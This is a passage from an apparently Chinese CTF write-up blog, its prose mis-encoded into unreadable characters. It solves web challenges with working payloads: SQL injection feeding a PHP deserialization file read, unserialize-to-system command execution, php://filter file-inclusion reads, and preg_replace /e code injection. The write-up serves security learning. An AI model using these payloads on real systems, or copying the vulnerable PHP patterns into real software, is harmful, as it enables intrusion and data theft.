<li>CURLINFO_HTTP_CODE ï¼šæœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç ã€‚<br>curl_getinfoï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å®ƒçš„å€¼ï¼Œå› ä¸ºè®¾ç½®äº†CURLINFO_HTTP_CODEï¼Œæ‰€ä»¥æ˜¯è¿”å›çš„çŠ¶æ€ç ã€‚</li>
</ul>
<p>å¦‚æœçŠ¶æ€ç ä¸æ˜¯404ï¼Œå°±è¿”å›execçš„ç»“æœã€‚<br>getå‡½æ•°åœ¨getBlogContents()é‡Œè¢«è°ƒç”¨ï¼Œä¼ å‚ä¸ºblog<br>ç»™å‚æ•°èµ‹ä¸ªå€¼ï¼Œååºåˆ—åŒ–çœ‹çœ‹flag.php</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new UserInfo();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">age</span>=12;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">blog</span>=<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/WLVRMOO2ZVHZ1IHR1E.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹æºä»£ç <br><img src="/images/FISBFG6M8XZVKJ8.png" srcset="/img/loading.gif" lazyload><br>base64è§£ç å°±å¯å¾—åˆ°flagäº†</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>é¡µé¢ä¸€ç›´åœ¨åˆ·æ–°ï¼ŒæŠ“ä¸ªåŒ…å…ˆ<br><img src="/images/ZQSBGIA79FQDV2.png" srcset="/img/loading.gif" lazyload><br>POSTæ£€æŸ¥å‰é¢æ˜¯å‡½æ•°ï¼Œåé¢æ˜¯å‚æ•°<br>è¿™é‡Œeval(system(â€˜lsâ€™))ç”¨ä¸äº†äº†ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†<br>åº”è¯¥æ˜¯ç”¨äº†call_user_func()å‡½æ•°ï¼Œç”¨file_get_contentsçœ‹ä¸€ä¸‹æºä»£ç </p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure>
<p>æ‰¾åˆ°phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œç”¨ååºåˆ—åŒ–è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bg.jpg index.php index.php</span><br><br><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure>
<p>flagåº”è¯¥æ˜¯è—åˆ°äº†æ›´éšè”½çš„ä½ç½®</p>
<p>ç”¨findå‘½ä»¤å…¨å±€æŸ¥æ‰¾<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/XR86EVQQXJ4OGAGCIE6.png" srcset="/img/loading.gif" lazyload><br>&#x2F;tmp&#x2F;flagoefiu4r93æ˜¯flagçš„æ­£ç¡®ä½ç½®<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><span class="hljs-regexp">//</span>flag&#123;d9827631-f2f1-<span class="hljs-number">407</span>b-<span class="hljs-number">9</span>ee9-<span class="hljs-number">5</span>fc84da1246a&#125;<br></code></pre></td></tr></table></figure>
<p>ç”¨readfileä¹Ÿå¯ä»¥<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=readfile&amp;p=/tmp/flagoefiu4r93<br><br><span class="hljs-attribute">or</span><br><br><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readfile&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æºä»£ç æ²¡æœ‰é€æ¼å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br>éšä¾¿è¿›å…¥ä¸€ä¸ªé€‰é¡¹<br>çœ‹äº†çœ‹urlæ ï¼Œ?category&#x3D;woofersï¼Œåº”è¯¥å­˜åœ¨sqlæ³¨å…¥<br><img src="/images/VR1N6OQCRZJXPPOO7AQX.png" srcset="/img/loading.gif" lazyload><br>æŠ¥é”™ä¿¡æ¯æå–åˆ°includeï¼Œå’ŒåŠ äº†.phpåç¼€<br>includeçš„è¯æˆ‘ä»¬ä½¿ç”¨ä¼ªåè®®<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure>
<p>è¿”å›ä¸€å¤§ä¸²base64ç¼–ç è§£ç åæŸ¥çœ‹æºç <br>æºç ä¸­å¤¹æ‚äº†phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>			<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>			&#123;<br>				<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>					<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>				&#125;<br>				<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>				&#125;<br>			&#125;<br>			<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>if(true||false||false)</code><br>è¿”å›çš„ç»“æœæ˜¯trueï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³ä¸€ä¸ªæ¡ä»¶æˆç«‹å³å¯ï¼Œæˆ‘ä»¬ç°åœ¨è¦è¯»å–çš„æ˜¯flag.php<br>ä½¿ç”¨ç›¸å¯¹è·¯å¾„<br>ç›¸å¯¹è·¯å¾„è®¡ç®—æ—¶ä¸­é—´ç›®å½•ä¸å­˜åœ¨å¹¶ä¸å½±å“</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><span class="hljs-regexp">//</span>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ZWE3NTMyYTktYTRjYS00MDA0LWIzOTEtZDAzZmY4Nzc3YmM0fQo/Pgo= <br></code></pre></td></tr></table></figure>
<p>è§£ç åå°±èƒ½å¾—åˆ°flagäº†</p>
<p>è¿˜å¯ä»¥åˆ©ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–flag.php<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure>
<p>å¥—ä¸€ä¸ªå­—ç¬¦indexç¬¦åˆæ¡ä»¶å¹¶ä¸”ä¼ å…¥flagï¼Œè¯»å–flag.php<br>å¯ä»¥å‘ç°å½“phpå®šä½ä¸åˆ°æˆ‘ä»¬è‡ªå·±åŠ çš„filteræ—¶ä¼šæŠ¥warning<br>ä½†å¹¶æ²¡æœ‰å½±å“æ‰§è¡Œ</p>
<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªifç”¨dataä¼ªåè®®é€šè¿‡,flagè¢«ç¦ç”¨äº†ï¼Œé‚£ä¹ˆè¯»è¯»æ³¨é‡Šé‡Œnext.php é‡Œçš„å†…å®¹<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure>

<p>next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>preg_replaceçš„&#x2F;eæ¨¡å¼å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´,ä¸çŸ¥é“è¿™ä¸ª$_SESSION[â€˜idâ€™]æ˜¯ä»€ä¹ˆé¬¼<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">ä¼ é€é—¨</a>éå¸¸è¯¦ç»†<br>å…ˆæ¥æå®šè¿™ä¸¤ä¸ª</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>phpinfo()&#125;<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸæ˜¾ç¤ºæˆ‘ä»¬éœ€è¦æ˜¾ç¤ºçš„å†…å®¹<br><img src="/images/M4DDC2IQVG3UJ5UHXDSK.png" srcset="/img/loading.gif" lazyload><br>éœ€è¦ä¼ å…¥$cmdå‚æ•°ï¼Œç„¶åevalæ‰§è¡Œæ‹¿åˆ°flag<br>getFlagæ²¡æœ‰è¢«è°ƒç”¨<br>è°ƒç”¨ä¸€ä¸‹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;<span class="hljs-attribute">cmd</span>=phpinfo();<br></code></pre></td></tr></table></figure>
<p>æˆåŠŸï¼Œå¼€å§‹rce</p>
